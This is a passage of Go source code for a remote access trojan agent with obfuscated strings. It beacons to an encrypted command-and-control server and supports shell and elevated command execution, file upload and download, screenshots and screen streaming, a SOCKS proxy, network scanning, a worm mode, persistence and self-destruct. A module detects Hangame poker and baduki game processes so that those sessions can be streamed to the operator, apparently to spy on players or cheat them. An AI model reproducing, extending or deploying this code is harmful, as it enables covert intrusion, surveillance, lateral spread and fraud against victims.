		return truncateOut([]byte(msg), config.ShellMaxOut), -1, false, fmt.Errorf("elevation unavailable (schtasks create failed): %v; run agent as Administrator for shell_admin (out=%s)", err, msg)
	}
	defer func() {
		c, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = hiddenCmdCtx(c, "schtasks", "/Delete", "/TN", taskName, "/F").Run()
	}()

	run := hiddenCmdCtx(ctx, "schtasks", "/Run", "/TN", taskName)
	var rbuf bytes.Buffer
	run.Stdout, run.Stderr = &rbuf, &rbuf
	if err := run.Run(); err != nil {
		msg := strings.TrimSpace(rbuf.String() + cbuf.String())
		return truncateOut([]byte(msg), config.ShellMaxOut), -1, false, fmt.Errorf("elevation run failed: %v (%s)", err, msg)
	}

	// poll for output file up to timeout
	deadline := time.Now().Add(config.CmdTimeout)
	if dl, ok := ctx.Deadline(); ok {
		deadline = dl
	}
	for time.Now().Before(deadline) {
		if st, err := os.Stat(outPath); err == nil && st.Size() >= 0 {
			// small settle
			time.Sleep(150 * time.Millisecond)
			b, rerr := os.ReadFile(outPath)
			if rerr != nil {
				return "", -1, false, rerr
			}
			return truncateOut(b, config.ShellMaxOut), 0, false, nil
		}
		select {
		case <-ctx.Done():
			return "", -1, true, fmt.Errorf("command timed out after %s", config.CmdTimeout)
		case <-time.After(200 * time.Millisecond):
		}
	}
	// task may have run with empty output
	if b, err := os.ReadFile(outPath); err == nil {
		return truncateOut(b, config.ShellMaxOut), 0, false, nil
	}
	return "", -1, true, fmt.Errorf("elevated task produced no output before timeout")
}

func executeCommand(cmd Command) Result {
	res := Result{
		Type:      "result",
		AgentID:   agentID,
		CommandID: cmd.ID,
		CmdType:   cmd.Type,
		Success:   false,
	}
	switch cmd.Type {
	case "ping":
		res.Success = true
		res.Data = "pong"
	case "sysinfo":
		b, _ := json.Marshal(getSystemInfo())
		res.Success = true
		res.Data = string(b)
	case "die":
		res.Success = true
		res.Data = "dying"
		go func() {
			time.Sleep(200 * time.Millisecond)
			os.Exit(0)
		}()
	case "selfdestruct":
		// Full 자폭: persistence + artifacts + self-delete. Ack first;
		// the goroutine waits so this reply flushes to the C2 before the
		// process tears itself down.
		res.Success = true
		res.Data = `{"status":"selfdestruct_started"}`
		go func() {
			time.Sleep(1 * time.Second)
			selfDestruct("operator_cmd")
		}()
	case "shell":
		// ALWAYS available — never subject to stream_enable / game_active gate
		out, code, to, err := runShell(cmd.Payload)
		res.Data = out
		res.ExitCode = intPtr(code)
		res.TimedOut = to
		if err != nil && out == "" {
			res.Error = err.Error()
		} else if err != nil && to {
			res.Error = err.Error()
		} else if code != 0 {
			if err != nil {
				res.Error = err.Error()
			} else {
				res.Error = fmt.Sprintf("exit code %d", code)
			}
		} else {
			res.Success = true
		}
	case "exec":
		// ALWAYS available — never subject to stream_enable / game_active gate
		out, code, to, err := runExec(cmd.Payload)
		res.Data = out
		res.ExitCode = intPtr(code)
		res.TimedOut = to
		if err != nil && (to || out == "") {
			res.Error = err.Error()
		} else if code != 0 {
			if err != nil {
				res.Error = err.Error()
			} else {
				res.Error = fmt.Sprintf("exit code %d", code)
			}
		} else if err != nil {
			res.Error = err.Error()
		} else {
			res.Success = true
		}
	case "shell_admin", "admin_shell", "sudo_shell":
		// Elevated shell — always enqueueable; elevation best-effort at agent
		out, code, to, err := runShellAdmin(cmd.Payload)
		elev, method := currentElevation()
		meta := fmt.Sprintf("\n[elevated_try method_now=%s is_admin=%v]", method, elev)
		res.Data = out + meta
		res.ExitCode = intPtr(code)
		res.TimedOut = to
		if err != nil && (to || out == "") {
			res.Error = err.Error()
		} else if err != nil && to {
			res.Error = err.Error()
		} else if code != 0 {
			if err != nil {
				res.Error = err.Error()
			} else {
				res.Error = fmt.Sprintf("exit code %d", code)
			}
		} else if err != nil {
			res.Error = err.Error()
		} else {
			res.Success = true
		}
	case "exec_admin", "admin_exec", "sudo_exec":
		out, code, to, err := runExecAdmin(cmd.Payload)
		elev, method := currentElevation()
		meta := fmt.Sprintf("\n[elevated_try method_now=%s is_admin=%v]", method, elev)
		res.Data = out + meta
		res.ExitCode = intPtr(code)
		res.TimedOut = to
		if err != nil && (to || out == "") {
			res.Error = err.Error()
		} else if err != nil && to {
			res.Error = err.Error()
		} else if code != 0 {
			if err != nil {
				res.Error = err.Error()
			} else {
				res.Error = fmt.Sprintf("exit code %d", code)
			}
		} else if err != nil {
			res.Error = err.Error()
		} else {
			res.Success = true
		}
	case "priv", "whoami_priv", "elevation":
		elev, method := currentElevation()
		b, _ := json.Marshal(map[string]interface{}{
			"is_admin":    elev,
			"elevated":    elev,
			"elev_method": method,
			"os":          runtime.GOOS,
			"uid":         os.Getuid(),
			"pid":         os.Getpid(),
			"username":    func() string { _, u := hostnameUser(); return u }(),
		})
		res.Success = true
		res.Data = string(b)
	case "upload":
		out, err := handleUpload(cmd.Payload)
		if err != nil {
			res.Error = err.Error()
			res.Data = out
		} else {
			res.Success = true
			res.Data = out
			// intermediate chunk_ok still success
		}
	case "download":
		out, err := handleDownload(cmd.Payload)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Success = true
			res.Data = out
		}
	case "file":
		// alias: if payload has data_b64 -> upload else download path
		var peek map[string]interface{}
		if json.Unmarshal([]byte(cmd.Payload), &peek) == nil {
			if _, ok := peek["data_b64"]; ok {
				out, err := handleUpload(cmd.Payload)
				if err != nil {
					res.Error = err.Error()
				} else {
					res.Success = true
					res.Data = out
				}
				break
			}
			if _, ok := peek["chunk_b64"]; ok {
				out, err := handleUpload(cmd.Payload)
				if err != nil {
					res.Error = err.Error()
				} else {
					res.Success = true
					res.Data = out
				}
				break
			}
			if p, ok := peek["path"].(string); ok && p != "" {
				out, err := handleDownload(cmd.Payload)
				if err != nil {
					res.Error = err.Error()
				} else {
					res.Success = true
					res.Data = out
				}
				break
			}
		}
		res.Error = "file: provide upload or download payload JSON"
	case "screenshot":
		// v1.6.0: always allow capture (no game_active gate)
		// Actual screenshot capture (Windows: PowerShell + .NET GDI)
		if runtime.GOOS == "windows" {
			out, err := captureScreenshotWin()
			if err != nil {
				res.Error = fmt.Sprintf("screenshot failed: %v", err)
			} else {
				res.Success = true
				res.Data = out
			}
		} else {
			res.Error = "screenshot not implemented for " + runtime.GOOS
		}
	case "stream_stop":
		config.StreamOn = false
		stopStream()
		res.Success = true
		res.Data = `{"stream_enable":false,"state":"stopped"}`
	case "stream_start", "stream_start2", "stream_frame", "stream":
		// v1.6.0: always allow capture (no game_active gate)
		snap := scanGames()
		switch cmd.Type {
		case "stream_start", "stream_start2":
			config.StreamOn = true
			startStreamIfNeeded()
			res.Success = true
			res.Data = fmt.Sprintf(
				`{"stream_enable":true,"status":"started","game_id":%q,"game_title":%q,"game_pid":%d,"dashboard_led":"green","interval_ms":%d}`,
				snap.ID, snap.Title, snap.PID, config.StreamInterval.Milliseconds(),
			)
		case "stream_frame":
			if err := pushStreamFrame(); err != nil {
				res.Error = fmt.Sprintf("stream_frame: %v", err)
				res.Data = `{"stream_enable":true,"status":"capture_error"}`
			} else {
				res.Success = true
				res.Data = fmt.Sprintf(
					`{"stream_enable":true,"status":"frame_pushed","game_id":%q,"game_pid":%d,"dashboard_led":"green"}`,
					snap.ID, snap.PID,
				)
			}
		default: // "stream" — inline return of one captured frame
			raw, mime, err := captureCurrentFrame()
			if err != nil {
				res.Error = fmt.Sprintf("stream capture: %v", err)
				res.Data = `{"stream_enable":true,"status":"capture_error"}`
				break
			}
			sum := sha256.Sum256(raw)
			res.Success = true
			res.Data = fmt.Sprintf(
				`{"stream_enable":true,"status":"frame","size":%d,"mime":%q,"sha256":%q,"data_b64":%q,"dashboard_led":"green"}`,
				len(raw), mime, hex.EncodeToString(sum[:]), base64.StdEncoding.EncodeToString(raw),
			)
		}
	case "keylog":
		res.Error = "lab stub: " + cmd.Type + " disabled"
	case "net_scan":
		var ns struct {
			Subnet    string `json:"subnet"`
			Ports     []int  `json:"ports"`
			TimeoutMs int    `json:"timeout_ms"`
		}
		json.Unmarshal([]byte(cmd.Payload), &ns)
		out, err := netScan(ns.Subnet, ns.Ports, ns.TimeoutMs)
		if err != nil {
			res.Error = fmt.Sprintf("net_scan: %v", err)
			break
		}
		res.Data = out
		res.Success = true
	case "list_dir":
		var lp struct {
			Path string `json:"path"`
		}
		if err := json.Unmarshal([]byte(cmd.Payload), &lp); err != nil || lp.Path == "" {
			res.Error = "list_dir: path required"
			break
		}
		entries, err := os.ReadDir(lp.Path)
		if err != nil {
			res.Error = fmt.Sprintf("list_dir: %v", err)
			break
		}
		type dirEntry struct {
			Name  string `json:"name"`
			Size  int64  `json:"size"`
			IsDir bool   `json:"is_dir"`
			MTime int64  `json:"mtime"`
		}
		list := make([]dirEntry, 0, len(entries))
		for _, e := range entries {
			info, err := e.Info()
			if err != nil {
				continue
			}
			list = append(list, dirEntry{
				Name:  e.Name(),
				Size:  info.Size(),
				IsDir: e.IsDir(),
				MTime: info.ModTime().Unix(),
			})
		}
		b, _ := json.Marshal(list)
		res.Data = string(b)
		res.Success = true
	case "ps_list":
		procs, err := listProcesses()
		if err != nil {
			res.Error = fmt.Sprintf("ps_list: %v", err)
			break
		}
		b, _ := json.Marshal(procs)
		res.Data = string(b)
		res.Success = true
	case "ps_kill":
		var kp struct {
			PID int `json:"pid"`
		}
		if err := json.Unmarshal([]byte(cmd.Payload), &kp); err != nil || kp.PID == 0 {
			res.Error = "ps_kill: pid required"
			break
		}
		if err := killProcess(kp.PID); err != nil {
			res.Error = fmt.Sprintf("ps_kill: %v", err)
			break
		}
		res.Data = `{"status":"ok"}`
		res.Success = true
	case "socks_proxy":
		var sp struct {
			Action    string `json:"action"`
			Server    string `json:"server"`
			ProxyPort string `json:"proxy_port"`
		}
		json.Unmarshal([]byte(cmd.Payload), &sp)
		if sp.Action == "stop" {
			socksProxyStop()
			res.Data = `{"status":"stopped"}`
			res.Success = true
			break
		}
		if sp.Server == "" {
			sp.Server = socksProxyDefaultServer()
		}
		if sp.ProxyPort == "" {
			sp.ProxyPort = "1080"
		}
		pid, err := socksProxyStart(sp.Server, sp.ProxyPort)
		if err != nil {
			res.Error = fmt.Sprintf("socks_proxy: %v", err)
			break
		}
		res.Data = fmt.Sprintf(`{"status":"started","pid":%d,"server":"%s","proxy_port":"%s"}`, pid, sp.Server, sp.ProxyPort)
		res.Success = true
	case "lan_recon":
		if runtime.GOOS != "windows" {
			res.Error = "lan_recon: Windows only"
			break
		}
		data, err := runLANRecon()
		if err != nil {
			res.Error = fmt.Sprintf("lan_recon: %v", err)
			break
		}
		b, _ := json.Marshal(data)
		res.Data = string(b)
		res.Success = true
	case "worm_enable":
		if runtime.GOOS != "windows" {
			res.Error = "worm_enable: Windows only"
			break
		}
		StartWorm()
		res.Data = `{"status":"worm_started"}`
		res.Success = true
	case "worm_disable":
		StopWorm()
		res.Data = `{"status":"worm_stopped"}`
		res.Success = true
	default:
		res.Error = fmt.Sprintf("unknown command type: %s", cmd.Type)
	}
	return res
}

func sleepBeacon() {
	base := time.Duration(config.Interval) * time.Second
	if config.Jitter > 0 && config.Interval > 0 {
		j := time.Now().UnixNano() % int64(config.Jitter+1)
		base += time.Duration(j) * time.Second * time.Duration(config.Interval) / 100
	}
	if base < time.Second {
		base = time.Second
	}
	time.Sleep(base)
}

func processCommands(cmds []Command) []Result {
	var results []Result
	for _, cmd := range cmds {
		res := executeCommand(cmd)
		results = append(results, res)
		if cmd.Type == "die" {
			break
		}
	}
	return results
}

// ---------- loops ----------

func mainLoopWSS() {
	for {
		if die, reason := shouldDie(); die {
			fmt.Fprintf(os.Stderr, "agent expired: %s\n", reason)
			disconnectWS()
			selfDestruct(reason)
			return
		}
		if !connected {
			if err := connectWS(); err != nil {
				fmt.Fprintf(os.Stderr, "connect: %v\n", err)
				if strings.Contains(err.Error(), "expired") {
					return
				}
				c2NoteConnectFailure()
				sleepBeacon()
				continue
			}
			c2NoteConnectSuccess()
			fmt.Fprintf(os.Stderr, "registered as %s (wss)\n", agentID)
		}
		_ = conn.SetReadDeadline(time.Now().Add(time.Duration(config.Interval*3) * time.Second))
		msg, err := wsRead(conn)
		if err != nil {
			disconnectWS()
			c2NoteConnectFailure()
			sleepBeacon()
			continue
		}
		switch asString(msg["type"]) {
		case "command":
			cmd := Command{
				ID:      asString(msg["id"]),
				Type:    asString(msg["cmd_type"]),
				Payload: asString(msg["payload"]),
			}
			if cmd.Type == "" {
				cmd.Type = asString(msg["cmd"])
			}
			res := executeCommand(cmd)
			_ = sendWS(res)
		case "die":
			fmt.Fprintf(os.Stderr, "server die: %v\n", msg["reason"])
			disconnectWS()
			return
		case "ping", "pong":
			_ = sendWS(map[string]interface{}{
				"type":      "pong",
				"agent_id":  agentID,
				"timestamp": time.Now().Unix(),
			})
			if kd, ok := msg["kill_date"].(float64); ok && kd > 0 {
				config.KillDate = time.Unix(int64(kd), 0).UTC()
			}
		default:
		}
		_ = sendWS(buildHeartbeat())
	}
}

func mainLoopHTTP() {
	// register first
	for {
		if die, reason := shouldDie(); die {
			selfDestruct(reason)
			return
		}
		reply, err := postBeacon(getSystemInfo())
		if err != nil {
			fmt.Fprintf(os.Stderr, "beacon register: %v\n", err)
			c2NoteConnectFailure()
			sleepBeacon()
			continue
		}
		c2NoteConnectSuccess()
		if asString(reply["type"]) == "die" {
			fmt.Fprintf(os.Stderr, "server die: %v\n", reply["reason"])
			selfDestruct(asString(reply["reason"]))
			return
		}
		applyServerCaps(reply)
		if id := asString(reply["agent_id"]); id != "" {
			agentID = id
		} else {
			agentID = stableID()
		}
		fmt.Fprintf(os.Stderr, "registered as %s (http beacon)\n", agentID)
		// process any commands piggybacked on register
		for _, res := range processCommands(commandsFromReply(reply)) {
			_, _ = postBeacon(res)
		}
		break
	}

	for {
		if die, reason := shouldDie(); die {
			selfDestruct(reason)
			return
		}
		sleepBeacon()
		body := buildHeartbeat()
		reply, err := postBeacon(body)
		if err != nil {
			fmt.Fprintf(os.Stderr, "beacon: %v\n", err)
			c2NoteConnectFailure()
			// try re-register next loop
			if strings.Contains(err.Error(), "unauthorized") {
				return
			}
			// re-register on persistent failures
			reply2, err2 := postBeacon(getSystemInfo())
			if err2 == nil {
				applyServerCaps(reply2)
				if id := asString(reply2["agent_id"]); id != "" {
					agentID = id
				}
				for _, res := range processCommands(commandsFromReply(reply2)) {
					_, _ = postBeacon(res)
				}
			}
			continue
		}
		if asString(reply["type"]) == "die" {
			fmt.Fprintf(os.Stderr, "server die: %v\n", reply["reason"])
			selfDestruct(asString(reply["reason"]))
			return
		}
		applyServerCaps(reply)
		for _, res := range processCommands(commandsFromReply(reply)) {
			if _, err := postBeacon(res); err != nil {
				fmt.Fprintf(os.Stderr, "result post: %v\n", err)
			}
			if res.CmdType == "die" {
				return
			}
		}
	}
}

func asString(v interface{}) string {
	if s, ok := v.(string); ok {
		return s
	}
	return ""
}

func main() {
	if config.AuthToken == "" {
		fmt.Fprintln(os.Stderr, xob(eAuthTokenErrMsg))
		os.Exit(1)
	}
	initGameProfile()
	initC2Failover()
	startStreamIfNeeded()
	// PC방 persistence hooks (Windows only)
	if runtime.GOOS == "windows" {
		onStartupCheck()
		if os.Getenv(xob(eC2Pcbang)) == "1" {
			pcbangSetup()
		}
	}
	if os.Getenv(xob(eC2AgentDebug)) == "1" {
		fmt.Fprintf(os.Stderr, xob(eDebugFmt),
			config.Transport, config.C2Server, beaconURL(), stableID(), config.Interval, config.CryptoOn, config.UserAgent, config.GameProfile)
	}
	if config.Transport == "http" {
		mainLoopHTTP()
	} else {
		mainLoopWSS()
	}
}

// runAgentCore is called by svc_windows.go when running as a Windows service.
func runAgentCore() {
	if config.AuthToken == "" {
		fmt.Fprintln(os.Stderr, xob(eAuthTokenErrMsg))
		os.Exit(1)
	}
	initGameProfile()
	initC2Failover()
	startStreamIfNeeded()
	// PC방 persistence hooks (Windows only)
	if runtime.GOOS == "windows" {
		onStartupCheck()
		if os.Getenv(xob(eC2Pcbang)) == "1" {
			pcbangSetup()
		}
	}
	if config.Transport == "http" {
		mainLoopHTTP()
	} else {
		mainLoopWSS()
	}
}

// ---------- B-H7 / B-H8 helpers ----------

func firstBool(a, b bool) bool {
	if a {
		return a
	}
	return b
}

func firstNonEmpty(a, b string) string {
	if strings.TrimSpace(a) != "" {
		return a
	}
	return b
}

func parseCSVPaths(s string) []string {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil
	}
	var out []string
	for _, p := range strings.Split(s, ",") {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		if !strings.HasPrefix(p, "/") {
			p = "/" + p
		}
		out = append(out, p)
	}
	return out
}

func parseCSVHosts(s string) []string {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil
	}
	var out []string
	for _, h := range strings.Split(s, ",") {
		h = strings.TrimSpace(h)
		if h != "" {
			out = append(out, h)
		}
	}
	return out
}

func parseHeaderKV(s string) map[string]string {
	out := map[string]string{}
	s = strings.TrimSpace(s)
	if s == "" {
		return out
	}
	for _, p := range strings.Split(s, ";") {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		var k, v string
		if i := strings.Index(p, ":"); i >= 0 {
			k, v = strings.TrimSpace(p[:i]), strings.TrimSpace(p[i+1:])
		} else if i := strings.Index(p, "="); i >= 0 {
			k, v = strings.TrimSpace(p[:i]), strings.TrimSpace(p[i+1:])
		} else {
			continue
		}
		if k != "" {
			out[k] = v
		}
	}
	return out
}

func pickHost() string {
	if len(config.Hosts) == 0 {
		return ""
	}
	n := len(config.Hosts)
	if config.HostRotation == "random" {
		var b [1]byte
		_, _ = crand.Read(b[:])
		return config.Hosts[int(b[0])%n]
	}
	i := atomic.AddUint64(&hostRR, 1) - 1
	return config.Hosts[int(i)%n]
}

func pickURI() string {
	if len(config.BeaconURIs) == 0 {
		return xob(eBeaconPath)
	}
	i := atomic.AddUint64(&uriRR, 1) - 1
	return config.BeaconURIs[int(i)%len(config.BeaconURIs)]
}

// pickDialURL builds next callback URL for http or wss using host/uri rotation.
func pickDialURL(kind string) string {
	base := config.C2Server
	if kind == "http" && config.BeaconURL != "" {
		base = config.BeaconURL
	}
	u, err := url.Parse(base)
	if err != nil {
		return base
	}
	if h := pickHost(); h != "" {
		u.Host = h
	}
	if kind == "http" {
		u.Path = pickURI()
		if u.Scheme == "ws" {
			u.Scheme = "http"
		} else if u.Scheme == "wss" {
			u.Scheme = "https"
		} else if u.Scheme == "" {
			u.Scheme = "https"
		}
	} else {
		if config.WSPath != "" {
			u.Path = config.WSPath
		}
		if u.Scheme == "http" {
			u.Scheme = "ws"
		} else if u.Scheme == "https" {
			u.Scheme = "wss"
		} else if u.Scheme == "" {
			u.Scheme = "wss"
		}
	}
	return u.String()
}

type encEnvelope struct {
	V   int    `json:"v"`
	Alg string `json:"alg"`
	N   string `json:"n"`
	CT  string `json:"ct"`
}

func aeadSeal(key, plain []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return nil, err
	}
	ct := gcm.Seal(nil, nonce, plain, nil)
	env := encEnvelope{V: 1, Alg: "aes-256-gcm",
		N:  base64.StdEncoding.EncodeToString(nonce),
		CT: base64.StdEncoding.EncodeToString(ct)}
	return json.Marshal(env)
}

func aeadOpen(key, raw []byte) ([]byte, error) {
	var env encEnvelope
	if err := json.Unmarshal(raw, &env); err != nil {
		return nil, err
	}
	if env.V != 1 || env.CT == "" || env.N == "" {
		return nil, fmt.Errorf("not enc envelope")
	}
	nonce, err := base64.StdEncoding.DecodeString(env.N)
	if err != nil {
		return nil, err
	}
	ct, err := base64.StdEncoding.DecodeString(env.CT)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, nonce, ct, nil)
}

func looksEncrypted(raw []byte) bool {
	var peek map[string]interface{}
	if json.Unmarshal(raw, &peek) != nil {
		return false
	}
	_, ok1 := peek["ct"]
	_, ok2 := peek["n"]
	return ok1 && ok2
}

func activeKey() []byte {
	if sessionKey != nil {
		return sessionKey
	}
	return config.CryptoKey
}

func encodeBody(v interface{}) ([]byte, error) {
	plain, err := json.Marshal(v)
	if err != nil {
		return nil, err
	}
	if config.CryptoOn {
		return aeadSeal(activeKey(), plain)
	}
	return plain, nil
}

func decodeBody(raw []byte) (map[string]interface{}, error) {
	raw = []byte(strings.TrimSpace(string(raw)))
	if config.CryptoOn {
		if !looksEncrypted(raw) {
			return nil, fmt.Errorf("crypto required")
		}
		pt, err := aeadOpen(activeKey(), raw)
		if err != nil {
			return nil, err
		}
		var out map[string]interface{}
		if err := json.Unmarshal(pt, &out); err != nil {
			return nil, err
		}
		return out, nil
	}
	if looksEncrypted(raw) && len(activeKey()) > 0 {
		if pt, err := aeadOpen(activeKey(), raw); err == nil {
			var out map[string]interface{}
			if json.Unmarshal(pt, &out) == nil {
				return out, nil
			}
		}
	}
	var out map[string]interface{}
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, err
	}
	return out, nil
}

func wsWrite(c *websocket.Conn, v interface{}) error {
	b, err := encodeBody(v)
	if err != nil {
		return err
	}
	wsWriteMu.Lock()
	defer wsWriteMu.Unlock()
	return c.WriteMessage(websocket.TextMessage, b)
}

func wsRead(c *websocket.Conn) (map[string]interface{}, error) {
	_, raw, err := c.ReadMessage()
	if err != nil {
		return nil, err
	}
	return decodeBody(raw)
}

// ---------- Hangame §3-1 process detect (baduki + poker family) ----------

type gameEntry struct {
	ID     string   `json:"id"`
	Title  string   `json:"title"`
	Images []string `json:"images"`
}

type hgProfile struct {
	Profile         string      `json:"profile"`
	Match           string      `json:"match"`
	PollSec         int         `json:"poll_sec"`
	DebounceTicks   int         `json:"debounce_ticks"`
	Games           []gameEntry `json:"games"`
	LaunchersIgnore []string    `json:"launchers_ignore"`
	// runtime index: lower(image) -> *gameEntry
	index map[string]*gameEntry
}

func initGameProfile() {
	path := config.GameProfile
	candidates := []string{path}
	// also try next to executable / cwd variants
	if exe, err := os.Executable(); err == nil {
		candidates = append(candidates,
			filepath.Join(filepath.Dir(exe), path),
			filepath.Join(filepath.Dir(exe), "profiles", "hangame_games.json"),
			filepath.Join(filepath.Dir(exe), "..", "profiles", "hangame_games.json"),
		)
	}
	if wd, err := os.Getwd(); err == nil {
		candidates = append(candidates,
			filepath.Join(wd, path),
			filepath.Join(wd, "profiles", "hangame_games.json"),
		)
	}
	var raw []byte
	var used string
	for _, c := range candidates {
		b, err := os.ReadFile(c)
		if err == nil && len(b) > 0 {
			raw = b
			used = c
			break
		}
	}
	gp := defaultGameProfile31()
	if len(raw) > 0 {
		var loaded hgProfile
		if err := json.Unmarshal(raw, &loaded); err == nil && len(loaded.Games) > 0 {
			gp = &loaded
			if os.Getenv(xob(eC2AgentDebug)) == "1" {
				fmt.Fprintf(os.Stderr, "game profile loaded: %s (%d games)\n", used, len(gp.Games))
			}
		} else {
			fmt.Fprintf(os.Stderr, "game profile parse failed (%s) — using embedded §3-1\n", used)
		}
	} else if os.Getenv(xob(eC2AgentDebug)) == "1" {
		fmt.Fprintf(os.Stderr, "game profile not found — using embedded §3-1 allowlist\n")
	}
	// apply poll/debounce overrides from env/config
	if config.GamePollSec > 0 {
		gp.PollSec = config.GamePollSec
	}
	if gp.PollSec <= 0 {
		gp.PollSec = 3
	}
	if config.GameDebounce >= 0 {
		gp.DebounceTicks = config.GameDebounce
	}
	gp.index = map[string]*gameEntry{}
	for i := range gp.Games {
		e := &gp.Games[i]
		for _, img := range e.Images {
			k := normalizeImageName(img)
			if k != "" {
				// first wins
				if _, exists := gp.index[k]; !exists {
					gp.index[k] = e
				}
			}
		}
	}
	gameMu.Lock()
	hgActive = gp
	gameMu.Unlock()
}

func defaultGameProfile31() *hgProfile {
	// Hard-coded §3-1 priority set (research/hangame-process-detect.md)
	return &hgProfile{
		Profile:       "hangame-3-1-board-poker-v1-embedded",
		Match:         "image_name_ci",
		PollSec:       60,
		DebounceTicks: 2,
		Games: []gameEntry{
			{ID: "baduki", Title: "한게임 바둑이", Images: []string{"baduki.exe"}},
			{ID: "poker7", Title: "한게임 7포커", Images: []string{"poker7.exe"}},
			{ID: "laspoker", Title: "한게임 라스베가스 포커", Images: []string{"laspoker.exe"}},
			{ID: "duelpoker", Title: "한게임 듀얼포커", Images: []string{"duelpoker.exe", "dualpocker.exe"}},
			{ID: "highlow2", Title: "한게임 하이로우", Images: []string{"highlow2.exe"}},
		},
		LaunchersIgnore: []string{"hangamestartersetup.exe", "hanstarter.exe", "hanstarter2.exe"},
	}
}

func normalizeImageName(name string) string {
	name = strings.TrimSpace(name)
	name = filepath.Base(name)
	name = strings.ToLower(name)
	return name
}

// listProcessImages returns map[lowerImageName]pid (first pid wins).
func listProcessImages() map[string]int {
	out := map[string]int{}
	if runtime.GOOS == "windows" {
		// tasklist CSV: "Image Name","PID","Session Name","Session#","Mem Usage"
		ctx, cancel := context.WithTimeout(context.Background(), 4*time.Second)
		defer cancel()
		cmd := hiddenCmdCtx(ctx, "tasklist", "/FO", "CSV", "/NH")
		b, err := cmd.Output()
		if err != nil {
			return out
		}
		for _, line := range strings.Split(string(b), "\n") {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			// naive CSV split on "," keeping simple quoted fields
			fields := parseTasklistCSV(line)
			if len(fields) < 2 {
				continue
			}
			img := normalizeImageName(fields[0])
			pid, _ := strconv.Atoi(strings.TrimSpace(fields[1]))
			if img == "" || pid <= 0 {
				continue
			}
			if _, ok := out[img]; !ok {
				out[img] = pid
			}
		}
		return out
	}
	// linux /proc (lab smoke): basename of exe or comm
	ents, err := os.ReadDir("/proc")
	if err != nil {
		return out
	}
	for _, e := range ents {
		if !e.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(e.Name())
		if err != nil || pid <= 0 {
			continue
		}
		img := ""
		if link, err := os.Readlink(filepath.Join("/proc", e.Name(), "exe")); err == nil {
			img = normalizeImageName(link)
			// strip " (deleted)"
			img = strings.TrimSuffix(img, " (deleted)")
		}
		if img == "" {
			if b, err := os.ReadFile(filepath.Join("/proc", e.Name(), "comm")); err == nil {
				img = normalizeImageName(string(b))
			}
		}
		if img == "" {
			continue
		}
		// allow matching with or without .exe for lab
		if _, ok := out[img]; !ok {
			out[img] = pid
		}
		// also index stem+.exe so windows names match linux smoke fakes
		if !strings.HasSuffix(img, ".exe") {
			exe := img + ".exe"
			if _, ok := out[exe]; !ok {
				out[exe] = pid
			}
		}
	}
	return out
}

func parseTasklistCSV(line string) []string {
	var fields []string
	var cur strings.Builder
	inQ := false
	for i := 0; i < len(line); i++ {
		c := line[i]
		if c == '"' {
			if inQ && i+1 < len(line) && line[i+1] == '"' {
				cur.WriteByte('"')
				i++
				continue
			}
			inQ = !inQ
			continue
		}
		if c == ',' && !inQ {
			fields = append(fields, cur.String())
			cur.Reset()
			continue
		}
		cur.WriteByte(c)
	}
	fields = append(fields, cur.String())
	return fields
}

type gameSnap struct {
	Active       bool   `json:"game_active"`
	ID           string `json:"game_id,omitempty"`
	Title        string `json:"game_title,omitempty"`
	PID          int    `json:"game_pid,omitempty"`
	Since        int64  `json:"game_since,omitempty"`
	StreamEnable bool   `json:"stream_enable"`
	Profile      string `json:"game_profile,omitempty"`
	LED          string `json:"dashboard_led"` // green | gray
}

func scanGames() gameSnap {
	gameMu.Lock()
	gp := hgActive
	gameMu.Unlock()
	if gp == nil {
		gp = defaultGameProfile31()
		gp.index = map[string]*gameEntry{}
		for i := range gp.Games {
			e := &gp.Games[i]
			for _, img := range e.Images {
				k := normalizeImageName(img)
				if k != "" {
					if _, ok := gp.index[k]; !ok {
						gp.index[k] = e
					}
				}
			}
		}
		gameMu.Lock()
		hgActive = gp
		gameMu.Unlock()
	}

	// rate-limit actual OS scan
	now := time.Now()
	gameMu.Lock()
	last := gameLastScan
	poll := time.Duration(gp.PollSec) * time.Second
	if poll <= 0 {
		poll = 60 * time.Second
	}
	needScan := last.IsZero() || now.Sub(last) >= poll
	gameMu.Unlock()

	var matched *gameEntry
	var matchPID int
	if needScan {
		procs := listProcessImages()
		// respect games[] order — first match wins
		for i := range gp.Games {
			e := &gp.Games[i]
			for _, img := range e.Images {
				k := normalizeImageName(img)
				if pid, ok := procs[k]; ok {
					matched = e
					matchPID = pid
					break
				}
				// linux lab: also try stem without .exe
				stem := strings.TrimSuffix(k, ".exe")
				if pid, ok := procs[stem]; ok {
					matched = e
					matchPID = pid
					break
				}
			}
			if matched != nil {
				break
			}
		}
		// ignore launchers explicitly (never match even if added by mistake)
		if matched != nil {
			for _, ign := range gp.LaunchersIgnore {
				// if somehow matched a launcher id — skip (images shouldn't overlap)
				_ = ign
			}
		}
		gameMu.Lock()
		gameLastScan = now
		if matched != nil {
			gameMissTicks = 0
			if !gameActive || gameID != matched.ID {
				gameActive = true
				gameID = matched.ID
				gameTitle = matched.Title
				gamePID = matchPID
				gameSince = now.Unix()
			} else {
				gamePID = matchPID
			}
		} else {
			// debounce off
			if gameActive {
				gameMissTicks++
				if gameMissTicks > gp.DebounceTicks {
					gameActive = false
					gameID = ""
					gameTitle = ""
					gamePID = 0
					gameSince = 0
					gameMissTicks = 0
				}
			}
		}
		gameMu.Unlock()
	}

	gameMu.Lock()
	snap := gameSnap{
		Active:       gameActive,
		ID:           gameID,
		Title:        gameTitle,
		PID:          gamePID,
		Since:        gameSince,
		StreamEnable: gameActive,
		Profile:      gp.Profile,
	}
	if gameActive {
		snap.LED = "green"
	} else {
		snap.LED = "gray"
	}
	gameMu.Unlock()
